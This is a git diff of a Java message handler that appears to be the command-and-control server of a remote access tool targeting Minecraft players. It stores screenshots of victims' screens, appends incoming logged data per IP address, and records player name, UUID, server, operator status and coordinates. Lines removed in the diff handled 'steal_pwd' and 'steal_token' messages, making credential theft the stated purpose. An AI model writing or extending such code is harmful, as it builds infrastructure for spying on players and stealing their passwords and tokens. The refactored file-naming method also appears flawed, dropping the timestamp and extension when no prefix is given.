@@ -1,12 +1,15 @@
 package me.soda.server.handlers;
 
+import com.google.gson.Gson;
+import me.soda.server.Server;
+import org.java_websocket.WebSocket;
+
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
-import java.util.Arrays;
 import java.util.Base64;
 
 import static me.soda.server.Server.log;
@@ -17,40 +20,43 @@ public class MessageHandler {
         return new String(result);
     }
 
-    private static String[] doStringParse(String[] msgArr) throws IllegalArgumentException {
-        if (msgArr.length < 2) throw new IllegalArgumentException();
-        String[] msgArr_ = decodeBase64(msgArr[1]).split(" ");
-        String[] strArr = new String[msgArr_.length - 1];
-        for (int index = 0; index < strArr.length; index++) {
-            strArr[index] = decodeBase64(msgArr_[index + 1]);
-        }
-        return strArr;
-    }
-
     @SuppressWarnings("ResultOfMethodCallIgnored")
-    public static void handle(String[] msgArr, String ip) {
+    public static void handle(String[] msgArr, WebSocket conn) {
+        String ip = conn.getRemoteSocketAddress().getAddress().getHostAddress();
         try {
             switch (msgArr[0]) {
                 case "screenshot" -> {
-                    File screenshotFile = new File("screenshots", getFileName("png", ip, true));
+                    File file = new File("screenshots", getFileName("", "png", ip, true));
                     new File("screenshots").mkdir();
-                    screenshotFile.createNewFile();
-                    FileOutputStream file = new FileOutputStream(screenshotFile);
-                    file.write(Base64.getDecoder().decode(msgArr[1]));
-                    file.close();
+                    file.createNewFile();
+                    FileOutputStream out = new FileOutputStream(file);
+                    out.write(Base64.getDecoder().decode(msgArr[1]));
+                    out.close();
                 }
-                case "steal_pwd", "steal_token" ->
-                        log("Message: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
+                case "skin" -> {
+                    String playerName = Server.clientMap.get(conn).playerName;
+                    File file = new File("skins", getFileName(playerName, "png", ip, false));
+                    new File("skins").mkdir();
+                    file.createNewFile();
+                    FileOutputStream out = new FileOutputStream(file);
+                    out.write(Base64.getDecoder().decode(msgArr[1]));
+                    out.close();
+                }
                 case "logging" -> {
-                    File logFile = new File("logging", getFileName("log", ip, false));
+                    File file = new File("logging", getFileName("", "log", ip, false));
                     new File("logging").mkdir();
-                    logFile.createNewFile();
-                    FileInputStream file2In = new FileInputStream(logFile);
-                    String oldInfo = new String(file2In.readAllBytes(), StandardCharsets.UTF_8);
-                    file2In.close();
-                    FileOutputStream file2Out = new FileOutputStream(logFile);
-                    file2Out.write((oldInfo + decodeBase64(msgArr[1])).getBytes(StandardCharsets.UTF_8));
-                    file2Out.close();
+                    file.createNewFile();
+                    FileInputStream in = new FileInputStream(file);
+                    String oldInfo = new String(in.readAllBytes(), StandardCharsets.UTF_8);
+                    in.close();
+                    FileOutputStream out = new FileOutputStream(file);
+                    out.write((oldInfo + decodeBase64(msgArr[1])).getBytes(StandardCharsets.UTF_8));
+                    out.close();
+                }
+                case "player" -> {
+                    String playerInfo = decodeBase64(msgArr[1]);
+                    Server.clientMap.get(conn).playerName = new Gson().fromJson(playerInfo, PlayerInfo.class).playerName;
+                    log("Message: " + msgArr[0] + " " + playerInfo);
                 }
                 default -> log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
             }
@@ -59,7 +65,13 @@ public class MessageHandler {
         }
     }
 
-    private static String getFileName(String suffix, String ip, boolean time) {
-        return "ip " + ip + (time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "") + "." + suffix;
+    private static String getFileName(String prefix, String suffix, String ip, boolean time) {
+        return prefix.isEmpty() ? ip : prefix + (time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "") + "." + suffix;
+    }
+
+    private static class PlayerInfo {
+        public String playerName, uuid, server;
+        public boolean isOp, inGame;
+        public double x, y, z;
     }
 }
